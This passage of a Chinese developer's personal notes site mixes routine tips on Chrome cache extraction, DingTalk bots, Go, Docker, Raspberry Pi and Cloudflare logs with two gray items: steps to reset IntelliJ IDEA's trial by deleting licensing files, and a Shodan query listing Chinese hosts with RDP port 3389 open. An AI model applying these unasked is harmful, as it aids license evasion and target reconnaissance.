\"text/plain\";\nif (contentTypeFound) {\ncontentType = match[1];\n}\n\nvar dataUri = \"data:\" + contentType + \";base64,\" + fileContents;\n\n// check for gzipped file\nvar gZipRgx = /content-encoding: gzip/i;\nif (gZipRgx.test(headerText)) {\nfilename += '.gz';\n}\n\n// check for image\nvar imageRgx = /image/i;\nvar isImage = imageRgx.test(contentType);\n\n// create link\nvar aTag = document.createElement('a');\naTag.textContent = \"Left-click to download the cached file\";\naTag.setAttribute('href', dataUri);\naTag.setAttribute('download', filename);\nparentElement.appendChild(aTag);\nparentElement.appendChild(document.createElement('br'));\n\n// create image\nif (isImage) {\nvar imgTag = document.createElement('img');\nimgTag.setAttribute(\"src\", dataUri);\nparentElement.appendChild(imgTag);\nparentElement.appendChild(document.createElement('br'));\n}\n\n// create warning\nif (!contentTypeFound) {\nvar pTag = document.createElement('p');\npTag.textContent = \"WARNING: the type of file was not found in the headers... defaulting to text file.\";\nparentElement.appendChild(pTag);\n}\n}\n\nfunction getBase64Char(base64Value) {\nif (base64Value &lt; 0) {\nthrow \"Invalid number: \" + base64Value;\n} else if (base64Value &lt;= 25) {\n// A-Z\nreturn String.fromCharCode(base64Value + \"A\".charCodeAt(0));\n} else if (base64Value &lt;= 51) {\n// a-z\nbase64Value -= 26; // a\nreturn String.fromCharCode(base64Value + \"a\".charCodeAt(0));\n} else if (base64Value &lt;= 61) {\n// 0-9\nbase64Value -= 52; // 0\nreturn String.fromCharCode(base64Value + \"0\".charCodeAt(0));\n} else if (base64Value &lt;= 62) {\nreturn '+';\n} else if (base64Value &lt;= 63) {\nreturn '/';\n} else {\nthrow \"Invalid number: \" + base64Value;\n}\n}\n\nfunction convertToBase64(input) {\n// http://en.wikipedia.org/wiki/Base64#Example\nvar remainingBits;\nvar result = \"\";\nvar additionalCharsNeeded = 0;\n\nvar charIndex = -1;\nvar charAsciiValue;\nvar advanceToNextChar = function() {\ncharIndex++;\ncharAsciiValue = input.charCodeAt(charIndex);\nreturn charIndex &lt; input.length;\n};\n\nwhile (true) {\nvar base64Char;\n\n// handle 1st char\nif (!advanceToNextChar()) break;\nbase64Char = charAsciiValue &gt;&gt;&gt; 2;\nremainingBits = charAsciiValue &amp; 3; // 0000 0011\nresult += getBase64Char(base64Char); // 1st char\nadditionalCharsNeeded = 3;\n\n// handle 2nd char\nif (!advanceToNextChar()) break;\nbase64Char = (remainingBits &lt;&lt; 4) | (charAsciiValue &gt;&gt;&gt; 4);\nremainingBits = charAsciiValue &amp; 15; // 0000 1111\nresult += getBase64Char(base64Char); // 2nd char\nadditionalCharsNeeded = 2;\n\n// handle 3rd char\nif (!advanceToNextChar()) break;\nbase64Char = (remainingBits &lt;&lt; 2) | (charAsciiValue &gt;&gt;&gt; 6);\nresult += getBase64Char(base64Char); // 3rd char\nremainingBits = charAsciiValue &amp; 63; // 0011 1111\nresult += getBase64Char(remainingBits); // 4th char\nadditionalCharsNeeded = 0;\n}\n\n// there may be an additional 2-3 chars that need to be added\nif (additionalCharsNeeded == 2) {\nremainingBits = remainingBits &lt;&lt; 2; // 4 extra bits\nresult += getBase64Char(remainingBits) + \"=\";\n} else if (additionalCharsNeeded == 3) {\nremainingBits = remainingBits &lt;&lt; 4; // 2 extra bits\nresult += getBase64Char(remainingBits) + \"==\";\n} else if (additionalCharsNeeded != 0) {\nthrow \"Unhandled number of additional chars needed: \" + additionalCharsNeeded;\n}\n\nreturn result;\n}\n})()\n</code></pre> <p>\u4f8b\u5982\u627e\u5230http://a3.qpic.cn/psb?/V12C1bLj2DcCgb/f9hTWn5wbxt3dZd5MlUCHX6tA9oqVOudgT2rqARLltk!/a/dI4BAAAAAAAA</p> <p>\u4f46\u8fd9\u6837\u53ea\u662f\u4e00\u5f20\u5c0f\u56fe\uff0c\u6211\u4eec\u5f53\u7136\u5e0c\u671b\u6709\u5927\u56fe\uff0c\u6bd4\u5bf9\u5927\u56fe\u7684url\u53d1\u73b0\u53ea\u8981\u5c06\u4e0a\u8ff0url\u7684/a/\u66ff\u6362\u4e3a/b/\u5373\u53ef</p> <p>\u6240\u4ee5\u603b\u7ed3\u4e00\u4e0b\u5c31\u662f\u6253\u5f00\u7f13\u5b58\u9875\u9762chrome://cache/\uff0c\u67e5\u627epsb\u5b57\u7b26\u4e32\uff0c\u627e\u5230\u60f3\u8981\u7684\u56fe\u7247\uff0c\u5982\u679c\u662f\u5c0f\u56fe\u5c31\u6539\u4e00\u4e0burl\u5f97\u5230\u5927\u56fe</p>"},{"location":"Developer/#_11","title":"\u4e3a\u4ec0\u4e48\u6211\u559c\u6b22\u5199\u535a\u5ba2\uff1f","text":"<p>\u6458\u81ea https://manishearth.github.io/blog/2018/08/26/why-i-enjoy-blogging/</p> <p>\u5199\u4e0b\u6765\u7684\u8fc7\u7a0b\u53d1\u73b0\u81ea\u5df1\u8fd8\u6709\u4e0d\u61c2\u7684\uff0c\u7ed9\u81ea\u5df1\u8bb2\u6e05\u695a\u751a\u81f3\u80fd\u53d1\u73b0rust\u6807\u51c6\u5e93\u7684bug\uff0c\u672c\u8d28\u4e0a\u662f\u7ed9\u5f88\u591a\u4eba\u8bb2\u9700\u8981\u8003\u8651\u6240\u6709\u65b9\u9762\u800c\u4e0d\u662f\u6700\u5c0f\u5fc5\u8981\uff1b\u5f53\u4f60\u89c9\u5f97\u663e\u800c\u6613\u89c1\u7684\u65f6\u5019\u5f88\u5bb9\u6613\u5931\u53bb\u89e3\u91ca\u6e05\u695a\u7684\u80fd\u529b</p> <p>\u8bfb\u65e7\u7684\u6587\u7ae0\u5f88\u6709\u8da3 \u8ba9\u81ea\u5df1\u56de\u5230\u5199\u4f5c\u7684\u90a3\u4e00\u65f6\u523b \u6bd4\u8f83\u5f53\u65f6\u81ea\u5df1\u7684\u7406\u89e3\u548c\u73b0\u5728\u7684 \u4f53\u4f1a\u81ea\u5df1\u7684\u8fdb\u6b65\uff0c\u91cd\u65b0\u5b66\u4e60\u5df2\u7ecf\u5fd8\u4e86\u7684</p> <p>\u5199\u4f5c\u80fd\u6362\u4e2a\u8111\u5b50 \u5728\u4e0d\u540c\u5de5\u4f5c\u4e4b\u524d\u5207\u6362 \u4f7f\u7528\u4e0d\u540c\u7684\u8111\u533a \u6574\u5929\u90fd\u6709\u7cbe\u529b</p> <p>\u5199blog\u80fd\u5077\u61d2 \u4ee5\u540e\u6709\u4eba\u95ee\u5230\u5c31\u80fd\u76f4\u63a5\u7ed9\u94fe\u63a5\u8bf4\u201c\u4f60\u60f3\u77e5\u9053\u66f4\u591a\u7684\u8bdd \u6211\u5df2\u7ecf\u5728\u8fd9\u5199\u8fc7\u4e86\u201d</p> <p>\u522b\u4eba\u5199\u8fc7\u4e86\u8fd8\u8981\u4e0d\u8981\u5199\uff1f\u8981\u5199\uff01 \u4f60\u7684\u7406\u89e3\u4e0d\u540c\uff0c\u6563\u843d\u5728\u4e0d\u540c\u5730\u65b9\u7684\u77e5\u8bc6\u7efc\u5408\u8d77\u6765\u4e5f\u6709\u4ef7\u503c</p> <p>\u4f60\u771f\u6b63\u7684\u804c\u8d23\u662f\u5f53\u4f60\u6709\u7a7afree\u4e86\uff0c\u4f60\u5e94\u8be5\u8ba9\u5176\u4ed6\u4eba\u4e5f\u8f7b\u677efree\uff0c\u5982\u679c\u4f60\u6709\u80fd\u529bpower\uff0c\u4f60\u7684\u804c\u8d23\u5c31\u662f\u4e3a\u5176\u4ed6\u4eba\u8d4b\u80fdempower</p> <p>\u81ea\u5b66\u4e0d\u610f\u5473\u7740\u5f53\u4e00\u4e2a\u7f16\u8bd1\u5668\u7684fuzzer\u968f\u673a\u5c1d\u8bd5\uff0c\u800c\u662f\u5b66\u6587\u6863tutorial\uff0c\u4ece\u4e66\u7c4d\u5b66\u7b97\u6cd5\u2014\u2014\u81ea\u5b66\u53ea\u662f\u8bf4\u4f60\u5b8c\u5168\u638c\u63a7\u81ea\u5df1\u7684\u5b66\u4e60\u8fc7\u7a0b\uff0c\u4f46\u4ecd\u7136\u4f9d\u8d56\u5176\u4ed6\u4eba\u7684\u5de5\u4f5c</p> <p>\u4f60\u4e5f\u5e94\u8be5\u5199\u535a\u5ba2 \u8fd9\u91cc\u6709\u4e00\u4e9b\u5efa\u8baehttps://jvns.ca/blog/2016/05/22/how-do-you-write-blog-posts/</p>"},{"location":"Developer/#atoutgoing","title":"\u652f\u6301\u88abat\u7684(outgoing)\u9489\u9489\u673a\u5668\u4eba","text":"<p>\u9700\u8981\u81ea\u5df1\u6ce8\u518c\u4e00\u4e2a\u4f01\u4e1a\uff0c\u7ba1\u7406\u5458\u624d\u80fd\u521b\u5efa\u8fd9\u79cd\u673a\u5668\u4eba\uff0c\u673a\u5668\u4eba\u53ea\u80fd\u5728\u5185\u90e8\u7fa4\u4f7f\u7528</p> <p>\u6587\u6863\uff1a https://ding-doc.dingtalk.com/doc#/serverapi2/elzz1p</p> <p>\u5176\u4e2d\u7f3a\u5931\u4e86\u5173\u4e8eatDingtalkIds\u7684\u63cf\u8ff0\uff0c\u9700\u8981\u770b\u8fd9\u4e2a\uff1a https://juejin.im/post/6844903922029576205</p> <p>\u9700\u8981\u6ce8\u610f\u7684\u5730\u65b9\u6709\uff1a\u4fee\u6539\u670d\u52a1\u5668\u56de\u8c03\u901a\u77e5\u5730\u5740\u548c\u4fee\u6539\u4e0a\u7ebf\u7684\u65f6\u5019\uff0c\u9489\u9489\u5c31\u4f1a\u9a8c\u8bc1\u670d\u52a1\u5668\u662f\u5426\u6b63\u5e38\uff0c\u4f60\u53ef\u4ee5<code>while true; nc -lp 8888 &lt; tmp.txt; done</code> \u6b7b\u5faa\u73af\u63d0\u4f9b\u4e2a\u6b63\u5e38\u7684http\u670d\u52a1</p> <p>POST\u53d1\u6765\u7684\u6570\u636e\u91cc\u9762\u6709\u4e34\u65f6\u7684url\u53ef\u4ee5\u53d1\u6d88\u606f\uff0c\u8fd8\u6709senderId\u662f\u53d1\u9001\u8005id\u7528\u6765\u5728atDingtalkIds\u4e2d\u4f7f\u7528</p> <p>\u6536\u5230\u7684POST\u5185\u5bb9\uff1a</p> <pre><code>{\"conversationId\":\"cidoAgtPbnu9MyulIyt0kpNYg==\",\"atUsers\":[{\"dingtalkId\":\"$:LWCP_v1:$Jh2MBlTKQnC/tN4tDTZB3eOIi+xOatMW\"}],\"chatbotCorpId\":\"dingb1d0b0ca51cxxxxxx\",\"chatbotUserId\":\"$:LWCP_v1:$Jh2MBlTKQnC/tN4tDTZB3eOIi+xOatMW\",\"msgId\":\"msgWjYj1k8LPNOBBy+jxNKwQw==\",\"senderNick\":\"\u53d1\u9001\u8005\u59d3\u540d\",\"isAdmin\":false,\"senderStaffId\":\"2665036700000000\",\"sessionWebhookExpiredTime\":1600622026555,\"createAt\":1600616626487,\"senderCorpId\":\"dingb1d0b0ca51c029b24ac5d6980000000\",\"conversationType\":\"2\",\"senderId\":\"$:LWCP_v1:$9gY0EpfG9gA0e4xnPjDHugeGB0JtdCJV\",\"conversationTitle\":\"\u7fa4\u7ec4\u6807\u9898\",\"isInAtList\":true,\"sessionWebhook\":\"https://oapi.dingtalk.com/robot/sendBySession?session=b28f49899ea1cba0d256673d66ffe386\",\"text\":{\"content\":\" 1+1\"},\"msgtype\":\"text\"}\n</code></pre> <p>\u56de\u590d\u53d1\u9001\u8005\u4e00\u4e2a666\uff1a</p> <pre><code>curl https://oapi.dingtalk.com/robot/sendBySession?session=b28f49899ea1cba0d256673d66ffe386 -H \"Content-Type: application/json\" --data '{\"msgtype\":\"text\", \"text\":{\"content\":\"666\"}, \"at\":{\"atDingtalkIds\":[\"$:LWCP_v1:$9gY0EpfG9gA0e4xnPjDHugeGB0JtdCJV\"]}}'\n</code></pre>"},{"location":"Developer/#go","title":"Go\u8bed\u8a00","text":""},{"location":"Developer/#_12","title":"\u5b89\u88c5","text":"<pre><code>wget -q https://golang.org/dl/go1.15.3.linux-amd64.tar.gz &amp;&amp;\\\n    tar -C /usr/local -xzf go1.15.3.linux-amd64.tar.gz\nexport PATH=$PATH:/usr/local/go/bin\n</code></pre>"},{"location":"Developer/#build","title":"\u63d0\u53d6build\u5931\u8d25\u7f3a\u5931\u7684\u5e93\u5b89\u88c5","text":"<pre><code>go build |&amp;  grep cannot |cut -d'\"' -f2|xargs go get\n</code></pre>"},{"location":"Developer/#idea20202-30","title":"IDEA2020.2 30\u5929\u540e\u91cd\u65b0\u8bd5\u7528","text":"<p>\u53c2\u8003\uff1a http://scz.617.cn:8/windows/202010261152.txt</p> <p>regedit\u627e\u5230HKCU\\SOFTWARE\\JavaSoft\\Prefs\\jetbrains\\idea\uff0c\u5176\u4e2d\u4f1a\u6709\u76ee\u5f55\u5305\u542bevlsprt3\\202\uff0c\u5220\u6389\u8fd9\u4e2a\u76ee\u5f55\u91cc\u9762\u7684evlsprt\u548cevlsprt2</p> <p>\u7136\u540e\u5220\u9664\u8fd9\u4e9b\u76ee\u5f55\uff1a</p> <pre><code>rd /s /q \"%APPDATA%\\JetBrains\\IntelliJIdea2020.2\\eval\"\ndel \"%APPDATA%\\JetBrains\\PermanentDeviceId\"\ndel \"%APPDATA%\\JetBrains\\PermanentUserId\"\ndel \"%APPDATA%\\JetBrains\\bl\"\ndel \"%APPDATA%\\JetBrains\\crl\"\n</code></pre> <p>\u7f16\u8f91\u201d%APPDATA%\\JetBrains\\IntelliJIdea2020.2\\options\\other.xml\u201d</p> <p>\u5220\u9664\u5305\u542bevlsprt.202\u6216evlsprt2.202\u7684\u884c</p>"},{"location":"Developer/#_13","title":"\u6811\u8393\u6d3e\u5230\u624b\u540e\u914d\u7f6e","text":"<p>\u4e00\u6b3e\u65b0\u7684\u6811\u8393\u6d3e4\u5230\u624b\uff0c\u9ed8\u8ba4\u4e3a\u82f1\u56fd\u952e\u76d8\u5e03\u5c40\u4e0d\u80fd\u8f93\u5165@#\u7b26\u53f7\uff0c\u663e\u793a\u5206\u8fa8\u7387\u4e0d\u591f1080p\uff0c\u4ee5\u53ca\u6709\u7ebf\u7f51\u7edc\u548c\u65e0\u7ebf\u7f51\u7edc\u4f18\u5148\u7ea7\u9700\u8981\u8c03\u6574</p>"},{"location":"Developer/#_14","title":"\u4fee\u6539\u952e\u76d8\u5e03\u5c40","text":"<p>\u67e5\u5230\u6709\u6559\u7a0b\u8bf4<code>sudo raspi-config</code>\u91cc\u53ef\u4ee5\u4fee\u6539\u952e\u76d8\u5e03\u5c40\uff0c\u5b9e\u6d4b\u53d1\u73b0\u6539\u4e86\u4e4b\u540e\u53ea\u6572\u4e86\u4e00\u6b21@\u4e4b\u540e\u53c8\u88ab\u6539\u56de\u53bb\u4e86\uff0c\u8fd8\u662f\u5f97\u4fee\u6539\u8f93\u5165\u6cd5\uff1a</p> <p>\u53c2\u8003 https://jingyan.baidu.com/article/3aed632e29dfd87011809169.html</p> <pre><code>sudo apt install fcitx\nreboot\n</code></pre> <p>\u53f3\u4e0a\u89d2\u6709\u8f93\u5165\u6cd5\u56fe\u6807 \u7ba1\u7406\u952e\u76d8 \u5220\u6389\u82f1\u56fd \u52a0\u4e0a\u82f1\u8bed(\u7f8e\u56fd)\u5373\u53ef</p>"},{"location":"Developer/#_15","title":"\u663e\u793a\u5206\u8fa8\u7387\u4fee\u6539","text":"<p>\u53c2\u8003 https://www.ncnynl.com/archives/201607/226.html</p> <p>\u6811\u8393\u6d3e\u6709\u4e24\u79cdhdmi\u8f93\u51fa\u6a21\u5f0f\uff0c1\u662fCEA\u7535\u89c6\uff0c2\u662fDMT\u7535\u8111\u663e\u793a\u5668</p> <p>\u67e5\u770b\u5f53\u524d\u663e\u793a\u5668\u652f\u6301\u7684\u5206\u8fa8\u7387\u4eec\uff1a</p> <pre><code>tvservice -m CEA\ntvservice -m DMT\n</code></pre> <p>\u5b9e\u9645\u4e0a\u663e\u793a\u51fa\u6765\u7684\u5e76\u4e0d\u4e00\u5b9a\u5b8c\u6574\uff0c\u8fd8\u9700\u8981\u81ea\u5df1\u591a\u6d4b\u8bd5\uff1a\u4f8b\u5982\u8bbe\u7f6e\u4e3a 640x480   60Hz</p> <pre><code>tvservice -e \"DMT 4\"\n</code></pre> <p>\u5efa\u8bae\u5728\u7ec8\u7aef\u91cc\u5148\u6572\u8fd9\u4e2a\u547d\u4ee4 \u5f53\u663e\u793a\u4e0d\u51fa\u6765\u7684\u65f6\u5019\u53ef\u4ee5\u6309\u2191\u56de\u8f66\u6539\u56de\u4e00\u4e2a\u6b63\u5e38\u663e\u793a\uff0c\u4e0d\u81f3\u4e8e\u91cd\u542f</p> <p>\u5b8c\u6574\u7684\u5217\u8868\u5728\u4e0a\u8ff0\u53c2\u8003\u94fe\u63a5\u4e2d\u6709\u4e86\uff0c\u53ef\u4ee5\u81ea\u5df1\u591a\u8bd5\u8bd5\uff0c\u5207\u6362\u5206\u8fa8\u7387\u540e\u8bb0\u5f97\u79fb\u52a8\u9f20\u6807 \u4e0d\u7136\u4e0d\u4f1a\u663e\u793a</p> <p>\u4f46\u662f\u6211\u5e0c\u671b\u7684\u5206\u8fa8\u7387 1920x1080 60Hz\u4e0d\u5728DMT\u5217\u8868\u4e2d\uff0c\u8fd9\u5c31\u9700\u8981\u81ea\u5b9a\u4e49\u5206\u8fa8\u7387\u4e86</p> <p>\u4fee\u6539<code>/boot/config.txt</code>\uff0c\u6dfb\u52a0\uff1a</p> <pre><code>hdmi_cvt=1920 1080 60 3\nhdmi_group=2\nhdmi_mode=87\nhdmi_drive=2\n</code></pre> <p>\u5176\u4e2dhdmi_cvt\u7684\u89e3\u91ca\uff1a https://www.raspberrypi.org/documentation/configuration/config-txt/video.md</p> <p>\u5176\u4e2d\u6700\u540e\u4e00\u4e2a3\u662fsdtv_aspect \u957f\u5bbd\u6bd4 \u6211\u8fd9\u91cc\u662f16:9 \u6240\u4ee5\u586b\u4e863</p> <p>\u4fee\u6539\u540e\u91cd\u542f\u5373\u53ef\uff0c\u4f3c\u4e4e\u76ee\u524d\u6811\u8393\u6d3e\u4e5f\u5b66\u806a\u660e\u4e86\uff0c\u5373\u4f7fconfig.txt\u91cc\u914d\u7f6e\u4e86\u9519\u8bef\u7684\u503c\u663e\u793a\u4e0d\u51fa\u6765\uff0c\u4e5f\u4f1a\u81ea\u52a8\u56de\u9000\u5230720p\u4fdd\u8bc1\u663e\u793a</p>"},{"location":"Developer/#_16","title":"\u8c03\u6574\u65e0\u7ebf\u7f51\u7edc\u548c\u6709\u7ebf\u7f51\u7edc\u7684\u4f18\u5148\u7ea7","text":"<p>\u6211\u5e0c\u671b\u5916\u7f51\u8bbf\u95ee(default\u8def\u7531)\u8d70wifi\uff0c\u5185\u7f51\u8bbf\u95ee(10.0.0.0/8)\u8d70\u6709\u7ebf\uff0c\u4f46\u9ed8\u8ba4\u8054\u7f51\u540e\u6709\u7ebf\u4e5f\u4f1a\u5360\u636edefault\u8def\u7531\u800c\u4e14\u4f18\u5148\u7ea7\u6bd4\u65e0\u7ebf\u9ad8\uff08\u8dc3\u70b9\u6570\u5c0f\uff09</p> <p>\u4e24\u4e2a\u7f51\u7edc\u90fd\u662f\u4f7f\u7528dhcp\u83b7\u53d6IP\uff0c\u6240\u4ee5\u53ef\u4ee5\u5728dhcp\u7684\u914d\u7f6e\u6587\u4ef6\u91cc\u914d\u7f6emetric</p> <p>\u53c2\u8003\uff1a https://raspberrypi.stackexchange.com/a/50951</p> <p>\u7f16\u8f91<code>/etc/dhcpcd.conf</code></p> <pre><code>interface wlan0\nmetric 200\n\ninterface eth0\nmetric 300\n</code></pre> <p>\u7136\u540e\u7f16\u8f91dhcp\u7684hook\u81ea\u52a8\u6267\u884croute\u547d\u4ee4\uff1a</p> <p>\u53c2\u8003 https://wiki.archlinux.org/index.php/dhcpcd#DHCP_static_route.28s.29</p> <p>\u7f16\u8f91<code>/etc/dhcpcd.exit-hook</code></p> <pre><code>route add -net 10.0.0.0/8 gw &lt;\u7f51\u5173ip&gt; dev eth0\n</code></pre>"},{"location":"Developer/#electron","title":"\u4fee\u6539Electron\u5e94\u7528","text":"<p>\u60f3\u8ba9\u8fd9\u4e2aElectron\u5e94\u7528\u6d4f\u89c8\u5668\u6253\u5f00\u81ea\u5b9a\u4e49\u7684\u9875\u9762\uff0c\u4f46\u4eba\u5bb6\u6ca1\u63d0\u4f9bF12\uff08\u867d\u7136\u6700\u540e\u53d1\u73b0\u4e5f\u6ca1\u5565\u7528Orz</p> <p>\u53c2\u8003\uff1a \u543e\u7231\u7834\u89e3-Electron\u8de8\u5e73\u53f0\u7a0b\u5e8f\u7834\u89e3\u7684\u4e00\u822c\u601d\u8def</p> <pre><code>npm install asar -g\n# \u5728resources\u76ee\u5f55\u53ef\u4ee5\u627e\u5230app.asar\uff0c\u8fd9\u6837\u89e3\u5305\uff1a\nasar e app.asar tmp\n\n# \u4fee\u6539\u540e\u91cd\u65b0\u6253\u5305\uff1a\nasar p tmp/ app.asar\n</code></pre> <p>\u5177\u4f53\u7684\u4fee\u6539\u633a\u7b80\u5355\uff0c\u627e\u5230\u5165\u53e3\u7684electron.js</p> <p>\u6ce8\u91ca\u6389new BrowserWindow\u7684titleBarStyle: \u2018hidden\u2019, removeMenu() \u4fee\u6539.loadURL(url)</p>"},{"location":"Developer/#cloudflare","title":"Cloudflare\u514d\u8d39\u8d26\u6237 \u83b7\u53d6\u8bbf\u95ee\u65e5\u5fd7","text":"<p>\u539f\u59cb\u65e5\u5fd7\u53ea\u5bf9\u4ed8\u8d39\u7684\u4f01\u4e1a\u7248\u5f00\u653e\uff0c\u96be\u9053\u6211\u4eec\u5c31\u6ca1\u6709\u65b9\u6cd5\u83b7\u53d6\u8bbf\u95ee\u65e5\u5fd7\u6765\u5206\u6790\u6d41\u91cf\u561b\uff1f</p> <p>\u770b\u5230\u9632\u706b\u5899\u7684\u62e6\u622a\u65e5\u5fd7\uff0c\u53c8\u53d1\u73b0\u201c\u7ed5\u8fc7\u201d\u8fd9\u4e2aaction\u4e5f\u4f1a\u8bb0\u5f55\u65e5\u5fd7\uff0c\u90a3\u6211\u4eec\u5c31\u53ef\u4ee5\u521b\u5efa\u4e00\u4e2a\u7ed5\u8fc7\u672c\u8eab\u5c31\u6ca1\u6709\u542f\u7528\u7684\u9632\u62a4\uff0c\u5c31\u80fd\u8bb0\u5f55\u6240\u6709\u6d41\u91cf\u4e86\u3002\u4f46\u6ce8\u610f\u8fd9\u4e2a\u9632\u706b\u5899\u65e5\u5fd7\u662f\u62bd\u6837\u8bb0\u5f55\u7684\u3002</p> <p>\u770bF12 Network\u53d1\u73b0\u4eba\u5bb6\u67e5\u8be2\u63a5\u53e3\u7528\u7684\u662fGraphQL\uff0c\u7136\u540e\u53d1\u73b0\u9700\u8981\u901a\u8fc7introspection\u624d\u80fd\u77e5\u9053\u6709\u54ea\u4e9b\u53ef\u7528\u7684\u5b57\u6bb5</p> <p>cloudflare\u7684\u6587\u6863\uff1a https://developers.cloudflare.com/analytics/graphql-api/getting-started/querying-basics</p> <p>\u5b9e\u9645\u7684introspection\u8bf7\u6c42\uff1ahttps://stackoverflow.com/questions/34199982/how-to-query-all-the-graphql-type-fields-without-writing-a-long-query</p> <p>\u67e5\u8be2\u9650\u5236\uff1a\u4e00\u6b21\u5206\u9875\u53ef\u4ee5\u83b7\u53d6\u6700\u592710000\u6761\u8bb0\u5f55\uff0cfilter\u5fc5\u987b\u6709\u5185\u5bb9\uff0c\u65f6\u95f4\u8de8\u5ea6\u4e00\u6b21\u4e0d\u80fd\u8d85\u8fc724\u5c0f\u65f6</p> <pre><code>import requests\nfrom pprint import pprint\nfrom datetime import timezone,datetime,timedelta\nsess=requests.session()\nfrom config import headers\n\ndef fetch(ts):\n    res = []\n    end = ts.strftime(\"%Y-%m-%dT%H:%M:%SZ\")\n    start = (ts-timedelta(days=1)).strftime(\"%Y-%m-%dT%H:%M:%SZ\")\n    x=sess.post(\"https://api.cloudflare.com/client/v4/graphql\", headers=headers, data= '{\"operationName\":\"ActivityLogQuery\",\"variables\":{\"zoneTag\":\"8a4335a74373cec7fd053241dc3e3f41\",\"filter\":{\"datetime_geq\":\"'+start+'\",\"datetime_leq\":\"'+end+'\"},\"limit\":10000,\"activityFilter\":{\"datetime_geq\":\"'+start+'\",\"datetime_leq\":\"'+end+'\"}},\"query\":\"query ActivityLogQuery($zoneTag: string, $filter: FirewallEventsAdaptiveGroupsFilter_InputObject, $activityFilter: FirewallEventsAdaptiveFilter_InputObject, $limit: int64\\\\u0021) { viewer { zones(filter: {zoneTag: $zoneTag}) { total: firewallEventsAdaptiveByTimeGroups(limit: 1, filter: $filter) { count avg { sampleInterval __typename } __typename } activity: firewallEventsAdaptive(filter: $activityFilter, limit: $limit, orderBy: [datetime_DESC, rayName_DESC, matchIndex_ASC]) { action clientASNDescription clientAsn clientCountryName clientIP clientRequestHTTPHost clientRequestHTTPMethodName clientRequestHTTPProtocol clientRequestPath clientRequestQuery datetime rayName ruleId source userAgent matchIndex metadata { key value __typename } sampleInterval originResponseStatus edgeResponseStatus clientRefererScheme clientRefererHost clientRefererPath clientRefererQuery clientIPClass  __typename } __typename } __typename }}\"}')\n    #print(x.json())\n    return x.json()[\"data\"][\"viewer\"]['zones'][0]['activity']\n\n\nlogformat = ['datetime', 'clientIP', 'clientIPClass', 'edgeResponseStatus', 'originResponseStatus', 'clientRequestHTTPMethodName', 'clientRequestPath', 'clientRequestQuery', 'clientRequestHTTPProtocol', 'clientRefererScheme', 'clientRefererHost', 'clientRefererPath', 'clientRefererQuery', 'userAgent', 'action', 'clientASNDescription', 'clientAsn', 'clientCountryName', 'clientRequestHTTPHost',  'matchIndex', 'ruleId', 'sampleInterval', 'source', 'rayName']\nfp=open(\"access.log\", \"w\")\nts = datetime.now(tz=timezone.utc)\nknownrays=set()\ndata = None\nwhile data is None or len(data)==10000:\n    data = fetch(ts)\n    for i in data:\n        if i['rayName'] in knownrays:\n            continue\n        line = \"\\t\".join(str(i[j]) for j in logformat)\n        fp.write(line+\"\\n\")\n    last = data[-1]\n    knownrays.update([i['rayName'] for i in data if i['datetime']==last['datetime']])\n    print(last['datetime'], \"len(knownrays)=\",len(knownrays))\n    ts = datetime.strptime(last['datetime'], \"%Y-%m-%dT%H:%M:%SZ\")\n</code></pre> <p>\u7136\u540e\u5c31\u80fd\u5206\u6790\u4f8b\u5982\u8bbf\u95ee\u6700\u591a\u7684IP: <code>cut -d$'\\t' -f2 access.log|sort|uniq -c|sort -hr|head -n 30</code></p>"},{"location":"Developer/#shodan-ip","title":"shodan \u641c\u7d22\u5f00\u653e\u7279\u5b9a\u7aef\u53e3\u7684ip\u5217\u8868","text":"<p>\u8fd9\u4e2a\u9700\u6c42\u53ea\u9700\u8981\u4f7f\u7528faucet\u5373\u53ef\uff0c\u514d\u8d39</p> <p>\u4e3e\u4e2a\u4f8b\u5b50\uff1a\u641c\u7d223389\u7684\u4e2d\u56fdip\uff1a</p> <p>https://beta.shodan.io/search/facet?query=port%3A3389+country%3Acn&amp;facet=ip</p> <p>\u4e5f\u53ef\u4ee5\u4f7f\u7528shodan\u7684python\u5305\u6765\u67e5\u8be2\uff0c\u9700\u8981\u6ce8\u518c\u4e00\u4e2a\u8d26\u53f7\u5f97\u5230api key\uff1a</p> <pre><code>import shodan\nx=shodan.Shodan(\"APIKEY\")\ndata=x.search(\"port:3389 country:cn\", facets=['ip:10000'])\niplist=([i[\"value\"] for i in data[\"facets\"][\"ip\"]])\n</code></pre>"},{"location":"Developer/#varlibdockeroverlay2","title":"\u627e\u5230 /var/lib/docker/overlay2 \u5bf9\u5e94\u7684\u5bb9\u5668","text":"<p>\u786c\u76d8\u7a7a\u95f4\u4e0d\u591f\uff0c\u53ef\u80fd\u662fdocker\u5360\u7528\u4e86\u592a\u591a\u7a7a\u95f4</p> <p>\u53c2\u8003 https://fabianlee.org/2021/04/08/docker-determining-container-responsible-for-largest-overlay-directories/</p> <pre><code>ncdu /var/lib/docker/overlay2 #\u67e5\u770b\u54ea\u4e9b\u76ee\u5f55\u5360\u636e\u7a7a\u95f4\u6700\u5927\ndocker inspect $(docker ps -qa) | jq -r 'map([.Name, .GraphDriver.Data.MergedDir]) | .[] | \"\\(.[0])\\t\\(.[1])\"' &gt; docker-mappings.txt\n</code></pre>"},{"location":"Docker/","title":"Docker","text":""},{"location":"Docker/#_1","title":"\u642c\u8fd0\u955c\u50cf","text":"<pre><code>IMAGE=mysql\ndocker save $IMAGE | 7z a -si $IMAGE.tar.7z\n7z x -so $IMAGE.tar.7z | docker load\n</code></pre>"},{"location":"Docker/#docker","title":"\u5b89\u88c5Docker","text":"<pre><code>curl -fsSL https://get.docker.com -o get-docker.sh\nsh get-docker.sh --mirror Aliyun\n</code></pre>"},{"location":"Docker/#myubuntu","title":"myubuntu \u57fa\u7840\u955c\u50cf","text":"<p>@TAG \u65f6\u533a timezone </p> <p>\u7b80\u5355\u5730\u5c06Docker\u5f53\u6210\u865a\u62df\u673a\u6765\u4f7f\u7528\u7684\u8bdd\uff0c\u81ea\u7136\u8981\u51c6\u5907\u4e2a\u597d\u7528\u7684\u57fa\u7840\u955c\u50cf\u54af</p> <p>\u57fa\u4e8e\u76ee\u524d\u6700\u65b0\u7684ubuntu18.04\uff0c\u914d\u7f6eapt\u6e90\u3001pip\u6e90\u3001\u65f6\u533a\u3001ssh\u5141\u8bb8\u5bc6\u7801\u767b\u5f55</p> <p>Dockerfile:</p> <pre><code>FROM ubuntu:18.04\nRUN sed -i 's/security.ubuntu.com/mirrors.aliyun.com/g' /etc/apt/sources.list &amp;&amp; \\\nsed -i 's/archive.ubuntu.com/mirrors.aliyun.com/g' /etc/apt/sources.list # \u4fee\u6539apt\u6e90\nRUN apt update &amp;&amp; apt install -y ssh curl wget net-tools 